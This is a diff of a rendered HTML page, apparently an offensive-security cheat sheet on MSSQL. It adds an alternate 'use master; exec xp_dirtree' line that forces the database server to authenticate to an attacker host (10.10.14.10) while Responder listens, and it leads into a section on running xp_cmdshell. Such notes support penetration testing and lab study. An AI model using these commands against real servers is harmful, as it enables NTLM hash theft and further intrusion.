@@ -56,6 +56,9 @@
 </span></span><span class="line"><span class="cl">sudo responder -I tun0
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># Inside mssql terminal
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;\\10.10.14.10\any\thing&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># Or
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">use</span><span class="w"> </span><span class="n">master</span><span class="p">;</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;\\10.10.14.10\any\thing&#39;</span><span class="p">;</span><span class="w">
 </span></span></span></code></pre></div><h4 id="run-xp_cmdshell">Run xp_cmdshell</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># Check any policy blocking xp_cmdshell
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">server_triggers</span><span class="p">;</span><span class="w">
